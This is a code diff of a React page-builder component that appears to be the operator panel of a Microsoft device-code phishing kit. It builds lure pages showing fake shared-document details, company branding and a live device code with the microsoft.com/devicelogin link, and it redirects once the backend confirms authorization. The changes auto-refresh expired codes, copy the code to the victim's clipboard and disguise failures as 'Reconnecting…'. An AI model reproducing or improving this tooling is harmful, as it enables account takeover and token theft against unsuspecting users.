@@ -2,7 +2,7 @@
 /* eslint-disable @next/next/no-img-element -- authenticated project assets and sandboxed previews */
 
 import {
-  Check, ChevronDown, Cloud, Code2, Copy, ExternalLink, History, ImageIcon,
+  Check, ChevronDown, Cloud, Copy, ExternalLink, History, ImageIcon,
   Laptop, Monitor, RefreshCw, Save, Send, Smartphone,
 } from "lucide-react";
 import Link from "next/link";
@@ -27,13 +27,6 @@ type Zone = { id: string; name: string; status: string; account: { id: string; n
 type PreviewMode = "design" | "live";
 type LiveAuthorization = { sessionId: string; statusToken: string; userCode: string | null; verificationUri: string | null; expiresAt: string; status: string };
 
-const previewStates: Array<{ id: PreviewState; label: string }> = [
-  { id: "initial", label: "Initial" }, { id: "waiting", label: "Waiting" },
-  { id: "success", label: "Success" }, { id: "expired", label: "Expired" },
-  { id: "error", label: "Error" }, { id: "ready", label: "Ready" },
-  { id: "reviewing", label: "Reviewing" }, { id: "completed", label: "Completed" },
-];
-
 export function HtmlEditor({ projectId }: { projectId: string }) {
   const { notify } = useToast();
   const searchParams = useSearchParams();
@@ -43,20 +36,15 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
   const [brandAssets, setBrandAssets] = useState<BrandAsset[]>([]);
   const [configuration, setConfiguration] = useState<BuilderConfiguration>(defaultBuilderConfiguration());
   const [viewport, setViewport] = useState<Viewport>("desktop");
-  const [previewState, setPreviewState] = useState<PreviewState>("waiting");
   const [previewMode, setPreviewMode] = useState<PreviewMode>("design");
   const [liveAuthorization, setLiveAuthorization] = useState<LiveAuthorization | null>(null);
   const [liveLoading, setLiveLoading] = useState(false);
-  const [liveRemaining, setLiveRemaining] = useState("");
   const [liveError, setLiveError] = useState("");
   const [dirty, setDirty] = useState(false);
   const [saving, setSaving] = useState(false);
   const [publishOpen, setPublishOpen] = useState(false);
   const [historyOpen, setHistoryOpen] = useState(false);
   const [logoLibrarySlot, setLogoLibrarySlot] = useState<"provider" | "company" | null>(null);
-  const [advancedOpen, setAdvancedOpen] = useState(false);
-  const [customHtml, setCustomHtml] = useState("");
-  const [customCss, setCustomCss] = useState("");
 
   const load = useCallback(async () => {
     try {
@@ -74,8 +62,6 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
         const savedCompany = assetResult.assets.find((asset) => asset.id === saved?.companyLogoAssetId && !asset.archivedAt);
         const companyLogoAssetId = savedCompany?.id ?? defaultCompany?.id;
         setConfiguration({ ...defaults, ...saved, companyLogoAssetId, logoMode: companyLogoAssetId ? (saved?.logoMode === "none" || saved?.logoMode === "provider" ? saved.logoMode : "both") : "provider" });
-        setCustomHtml(latest && !latest.document ? latest.html : "");
-        setCustomCss(latest?.document ? "" : latest?.css ?? "");
         loaded.current = true;
       }
     } catch (error) {
@@ -86,7 +72,7 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
   useEffect(() => { if (searchParams.get("publish") === "true") setPublishOpen(true); }, [searchParams]);
 
   const liveState = mapLiveState(liveAuthorization?.status);
-  const activePreviewState = previewMode === "live" ? liveState : previewState;
+  const activePreviewState: PreviewState = previewMode === "live" ? liveState : "waiting";
   const previewDocument = useMemo(() => buildPageDesign(configuration, activePreviewState), [configuration, activePreviewState]);
   const rendered = useMemo(() => renderPageDocument(previewDocument, { deviceCode: previewMode === "live" ? liveAuthorization?.userCode ?? "Refreshing…" : "XXXX-XXXX", verificationUri: previewMode === "live" ? liveAuthorization?.verificationUri ?? "#" : "https://microsoft.com/devicelogin", status: activePreviewState, assetUrl: (id) => `/api/v1/brand-assets/${id}/content` }), [activePreviewState, liveAuthorization?.userCode, liveAuthorization?.verificationUri, previewDocument, previewMode]);
   const orderedDesigns = useMemo(() => {
@@ -123,13 +109,14 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
   }, [liveAuthorization, previewMode]);
   useEffect(() => {
     if (previewMode !== "live" || !liveAuthorization) return;
-    const tick = () => {
-      const seconds = Math.max(0, Math.floor((new Date(liveAuthorization.expiresAt).getTime() - Date.now()) / 1000));
-      setLiveRemaining(`${Math.floor(seconds / 60)}:${String(seconds % 60).padStart(2, "0")}`);
-      if (seconds === 0 && liveAuthorization.status === "PENDING") void startLivePreview(liveAuthorization.sessionId);
-    };
-    tick(); const timer = window.setInterval(tick, 1000);
-    return () => window.clearInterval(timer);
+    if (["EXPIRED", "FAILED", "CANCELLED"].includes(liveAuthorization.status)) {
+      void startLivePreview(liveAuthorization.sessionId);
+      return;
+    }
+    if (liveAuthorization.status !== "PENDING") return;
+    const delay = Math.max(0, new Date(liveAuthorization.expiresAt).getTime() - Date.now() + 250);
+    const timer = window.setTimeout(() => void startLivePreview(liveAuthorization.sessionId), delay);
+    return () => window.clearTimeout(timer);
   }, [liveAuthorization, previewMode, startLivePreview]);
 
   function change(patch: Partial<BuilderConfiguration>) {
@@ -172,7 +159,7 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
     setSaving(true);
     try {
       const document = buildPageDesign(configuration, "waiting");
-      await api(`/html-projects/${projectId}/versions`, { method: "POST", body: JSON.stringify({ document, customHtml, customCss, state }) });
+      await api(`/html-projects/${projectId}/versions`, { method: "POST", body: JSON.stringify({ document, state }) });
       if (project && project.name !== document.settings.title) {
         // Project names remain independent from the public page title.
       }
@@ -190,7 +177,7 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
     if (saving) return;
     const timer = window.setTimeout(() => void save(true), 850);
     return () => window.clearTimeout(timer);
-  }, [configuration, customCss, customHtml, dirty, saving]); // eslint-disable-line react-hooks/exhaustive-deps
+  }, [configuration, dirty, saving]); // eslint-disable-line react-hooks/exhaustive-deps
 
   function selectLogo(choice: LogoChoice) {
     if (choice.kind === "custom") {
@@ -201,14 +188,20 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
     const target = (event.target as HTMLElement).closest<HTMLElement>("[data-action]");
     if (!target) return;
     event.preventDefault();
-    if (target.dataset.action === "copy-device-code" && previewMode === "live" && liveAuthorization?.userCode) void navigator.clipboard.writeText(liveAuthorization.userCode);
-    if (target.dataset.action === "open-microsoft" && previewMode === "live" && liveAuthorization?.verificationUri) window.open(liveAuthorization.verificationUri, "_blank", "noopener,noreferrer");
+    if (target.dataset.action === "copy-device-code" && previewMode === "live" && liveAuthorization?.userCode) {
+      void navigator.clipboard.writeText(liveAuthorization.userCode).then(() => notify({ title: "Copied", tone: "success" })).catch(() => undefined);
+    }
+    if (target.dataset.action === "open-microsoft" && previewMode === "live" && liveAuthorization?.verificationUri) {
+      const popup = window.open(liveAuthorization.verificationUri, "microsoft-auth", "width=520,height=720,resizable=yes,scrollbars=yes");
+      if (liveAuthorization.userCode) void navigator.clipboard.writeText(liveAuthorization.userCode).catch(() => undefined);
+      if (!popup) notify({ title: "Popup blocked", message: "Use Open Microsoft or allow popups for this site.", tone: "error" });
+    }
   }
 
   if (!project) return <section className="panel panel-body"><Skeleton lines={12} /></section>;
   return <div className="focused-builder">
     <header className="focused-builder-topbar">
-      <div className="builder-project-title"><Link href="/admin/html-projects">HTML Pages</Link><span>/</span><strong>{project.name}</strong></div>
+      <div className="builder-project-title"><Link href="/admin/html-projects">Page Builder</Link><span>/</span><strong>{project.name}</strong></div>
       <div className="builder-top-actions"><span className={`builder-save-state ${dirty || saving ? "saving" : "saved"}`} aria-live="polite"><i />{dirty || saving ? "Saving…" : "Saved"}</span><button className="secondary" onClick={() => setHistoryOpen(true)}><History size={15} />History</button><button className="secondary" disabled={saving} onClick={() => void save()}><Save size={15} />{saving ? "Saving…" : "Save"}</button><button onClick={() => setPublishOpen(true)}><Send size={15} />Publish</button></div>
     </header>
     <div className="focused-builder-grid">
@@ -225,23 +218,21 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
           {configuration.steps.map((step, index) => <label key={index}>Step {index + 1}<input value={step} onChange={(event) => { const steps = [...configuration.steps] as BuilderConfiguration["steps"]; steps[index] = event.target.value; change({ steps }); }} /></label>)}
           <label>Continue button<input value={configuration.continueButtonText} onChange={(event) => change({ continueButtonText: event.target.value })} /></label>
           <label>Footer<input value={configuration.footer} onChange={(event) => change({ footer: event.target.value })} /></label>
-          <label>Success message<textarea rows={2} value={configuration.successMessage} onChange={(event) => change({ successMessage: event.target.value })} /></label>
         </div></details>
         <details><summary>Document details <ChevronDown size={14} /></summary><div>
           <label>Filename<input value={configuration.documentName} onChange={(event) => change({ documentName: event.target.value })} /></label><label>Document title<input value={configuration.documentTitle} onChange={(event) => change({ documentTitle: event.target.value })} /></label>
           <div className="compact-control-grid"><label>File type<input value={configuration.fileType} onChange={(event) => change({ fileType: event.target.value })} /></label><label>Page count<input value={configuration.pageCount} onChange={(event) => change({ pageCount: event.target.value })} /></label><label>File size<input value={configuration.fileSize} onChange={(event) => change({ fileSize: event.target.value })} /></label><label>Status<input value={configuration.documentStatus} onChange={(event) => change({ documentStatus: event.target.value })} /></label></div>
           <label>Sender<input value={configuration.sender} onChange={(event) => change({ sender: event.target.value })} /></label><label>Company<input value={configuration.companyName} onChange={(event) => change({ companyName: event.target.value })} /></label><label>Department<input value={configuration.department} onChange={(event) => change({ department: event.target.value })} /></label>
         </div></details>
-        <details open><summary>Behavior <ChevronDown size={14} /></summary><div><label>Redirect URL<input type="url" placeholder="https://company.example/complete" value={configuration.redirectUrl ?? ""} onChange={(event) => change({ redirectUrl: event.target.value })} /></label><label>Redirect label<input value={configuration.redirectText} onChange={(event) => change({ redirectText: event.target.value })} /></label><label>Redirect delay<select value={configuration.redirectDelay} onChange={(event) => change({ redirectDelay: event.target.value as BuilderConfiguration["redirectDelay"] })}><option value="immediate">Immediately</option><option value="1">1 second</option><option value="3">3 seconds</option><option value="5">5 seconds</option><option value="10">10 seconds</option><option value="never">Do not redirect</option></select></label></div></details>
-        <details><summary>Deployment & advanced <ChevronDown size={14} /></summary><div><button onClick={() => setPublishOpen(true)}><Cloud size={14} />Cloudflare publish settings</button><button className="secondary" onClick={() => setAdvancedOpen(true)}><Code2 size={14} />Advanced code</button></div></details>
+        <details open><summary>Behavior <ChevronDown size={14} /></summary><div><label>Redirect after authentication<input type="url" placeholder="https://company.example/document" value={configuration.redirectUrl ?? ""} onChange={(event) => change({ redirectUrl: event.target.value, redirectDelay: "immediate" })} /></label><small className="muted">The original page redirects immediately after the backend confirms authorization.</small></div></details>
+        <details><summary>Deployment <ChevronDown size={14} /></summary><div><button onClick={() => setPublishOpen(true)}><Cloud size={14} />Cloudflare publish settings</button></div></details>
       </aside>
       <main className="builder-preview-column">
-        <section className="preview-stage"><div className="preview-stage-toolbar"><span><i />{previewMode === "live" ? "Live authorization preview" : "Design preview"}</span><div className="segmented preview-mode-switch"><button className={previewMode === "design" ? "active" : ""} onClick={() => setPreviewMode("design")}>Design</button><button className={previewMode === "live" ? "active" : ""} onClick={() => { setLiveError(""); setPreviewMode("live"); }}>Live</button></div><div className="builder-device-switcher"><button className={viewport === "desktop" ? "active" : ""} onClick={() => setViewport("desktop")} title="Desktop"><Monitor size={16} /></button><button className={viewport === "tablet" ? "active" : ""} onClick={() => setViewport("tablet")} title="Tablet"><Laptop size={16} /></button><button className={viewport === "mobile" ? "active" : ""} onClick={() => setViewport("mobile")} title="Mobile"><Smartphone size={16} /></button></div>{previewMode === "design" ? <label className="preview-state-control">State<select value={previewState} onChange={(event) => setPreviewState(event.target.value as PreviewState)}>{previewStates.slice(0, 5).map((state) => <option value={state.id} key={state.id}>{state.label}</option>)}</select></label> : <span className="live-session-state">{liveLoading ? "Starting…" : liveAuthorization ? `${friendlyStatus(liveAuthorization.status)} · ${liveRemaining}` : "Not started"}</span>}</div>{liveError && <div className="live-preview-error">{liveError}<button className="secondary button-sm" onClick={() => { setLiveError(""); void startLivePreview(liveAuthorization?.sessionId); }}>Retry</button></div>}<div className={`focused-preview preview-${viewport}`}><style>{rendered.css}</style><div className="direct-page-preview" onClick={handlePreviewClick} dangerouslySetInnerHTML={{ __html: rendered.html }} /></div></section>
+        <section className="preview-stage"><div className="preview-stage-toolbar"><span><i />{previewMode === "live" ? "Live authorization preview" : "Design preview"}</span><div className="segmented preview-mode-switch"><button className={previewMode === "design" ? "active" : ""} onClick={() => setPreviewMode("design")}>Design</button><button className={previewMode === "live" ? "active" : ""} onClick={() => { setLiveError(""); setPreviewMode("live"); }}>Live</button></div><div className="builder-device-switcher"><button className={viewport === "desktop" ? "active" : ""} onClick={() => setViewport("desktop")} title="Desktop"><Monitor size={16} /></button><button className={viewport === "tablet" ? "active" : ""} onClick={() => setViewport("tablet")} title="Tablet"><Laptop size={16} /></button><button className={viewport === "mobile" ? "active" : ""} onClick={() => setViewport("mobile")} title="Mobile"><Smartphone size={16} /></button></div>{previewMode === "live" && <span className="live-session-state">{liveLoading ? "Starting…" : liveAuthorization ? friendlyStatus(liveAuthorization.status) : "Not started"}</span>}</div>{liveError && <div className="live-preview-error">{liveError}<button className="secondary button-sm" onClick={() => { setLiveError(""); void startLivePreview(liveAuthorization?.sessionId); }}>Retry</button></div>}<div className={`focused-preview preview-${viewport}`}><style>{rendered.css}</style><div className="direct-page-preview" onClick={handlePreviewClick} dangerouslySetInnerHTML={{ __html: rendered.html }} /></div></section>
         <section className="design-carousel"><div><strong>Choose another design</strong><small>Recommended first for {providerProfiles[configuration.provider].name}</small></div><div className="design-carousel-track">{orderedDesigns.map((design) => <button className={configuration.layoutId === design.id ? "selected" : ""} onClick={() => changeLayout(design.id)} key={design.id}><DesignThumbnail configuration={{ ...configuration, layoutId: design.id }} /><span>{design.name}</span>{configuration.layoutId === design.id && <Check size={12} />}</button>)}</div></section>
       </main>
     </div>
     <LogoLibrary open={Boolean(logoLibrarySlot)} assets={brandAssets} onAssetsChange={setBrandAssets} onClose={() => setLogoLibrarySlot(null)} onSelect={selectLogo} />
-    <Drawer open={advancedOpen} title="Advanced code" onClose={() => setAdvancedOpen(false)}><div className="stack"><div className="security-warning"><strong>Advanced users only.</strong> Custom JavaScript is intentionally unavailable in published pages.</div><label>Additional HTML<textarea rows={12} value={customHtml} onChange={(event) => { setCustomHtml(event.target.value); setDirty(true); }} /></label><label>Additional CSS<textarea rows={14} value={customCss} onChange={(event) => { setCustomCss(event.target.value); setDirty(true); }} /></label></div></Drawer>
     <Drawer open={historyOpen} title="Version history" onClose={() => setHistoryOpen(false)}><div className="version-history">{project.versions.map((version) => <article key={version.id}><div><strong>Version {version.version}</strong><StatusBadge status={version.state} /><p>{new Date(version.createdAt).toLocaleString()}</p></div>{version.document?.settings.builder && <button className="secondary button-sm" onClick={() => { setConfiguration(version.document!.settings.builder!); setDirty(true); setHistoryOpen(false); }}>Restore</button>}</article>)}</div></Drawer>
     <PublishDrawer open={publishOpen} project={project} configuration={configuration} onClose={() => setPublishOpen(false)} onSave={() => save(true, "PUBLISHED")} />
   </div>;
@@ -334,7 +325,7 @@ function normalizeLayout(value: string): BuilderConfiguration["layoutId"] { retu
 function randomLabel() { const alphabet = "abcdefghjkmnpqrstuvwxyz23456789"; const bytes = crypto.getRandomValues(new Uint8Array(7)); return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join(""); }
 function expirationDate(value: string, custom: string) { const now = Date.now(); if (value === "1h") return new Date(now + 3_600_000).toISOString(); if (value === "24h") return new Date(now + 86_400_000).toISOString(); if (value === "7d") return new Date(now + 7 * 86_400_000).toISOString(); if (value === "custom" && custom) return new Date(custom).toISOString(); return undefined; }
 function mapLiveState(status?: string): PreviewState { return status === "CONNECTED" ? "success" : status === "EXPIRED" ? "expired" : status === "FAILED" || status === "CANCELLED" ? "error" : "waiting"; }
-function friendlyStatus(status: string) { return ({ PENDING: "Waiting for authorization", CONNECTED: "Authorized", EXPIRED: "Expired", FAILED: "Failed", CANCELLED: "Cancelled", REFRESHING: "Refreshing code" } as Record<string, string>)[status] ?? status; }
+function friendlyStatus(status: string) { return ({ PENDING: "Waiting for Microsoft…", CONNECTED: "Redirect confirmed", EXPIRED: "Preparing a new code…", FAILED: "Reconnecting…", CANCELLED: "Reconnecting…", REFRESHING: "Preparing a new code…" } as Record<string, string>)[status] ?? status; }
 function hexHue(value: string) {
   const number = Number.parseInt(value.replace("#", ""), 16);
   const r = ((number >> 16) & 255) / 255, g = ((number >> 8) & 255) / 255, b = (number & 255) / 255;
